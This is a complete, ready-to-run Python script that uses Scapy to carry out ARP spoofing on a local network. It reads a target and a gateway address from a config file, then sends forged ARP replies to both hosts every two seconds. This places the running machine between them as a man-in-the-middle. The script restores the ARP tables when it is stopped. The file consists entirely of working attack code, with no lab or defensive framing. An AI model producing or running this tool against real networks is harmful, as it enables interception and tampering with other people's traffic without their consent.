from scapy.all import *
import yaml
import time
import sys

def get_mac(ip):
    # Robust MAC fetching
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC for {target_ip}")
        return
    
    # op=2 is an ARP Reply (The "Lie")
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(packet, verbose=False)

def restore(dest_ip, source_ip):
    # Restore the original MAC addresses (The "Cleanup")
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    
    # Send the REAL information to reset the ARP table
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    # Load config safely
    try:
        with open("config.yaml") as f:
            config = yaml.safe_load(f)
    except FileNotFoundError:
        print("Error: config.yaml not found.")
        sys.exit()

    target_ip = config["target"]
    gateway_ip = config["gateway"]

    try:
        print(f"[*] Starting Spoofer on {target_ip}...")
        print("[*] Press Ctrl+C to stop and restore network.")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip) # Spoof both sides
            time.sleep(2) # Send packets every 2 seconds
            
    except KeyboardInterrupt:
        print("\n[!] Detected Ctrl+C. Restoring network...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Network restored. Exiting.")
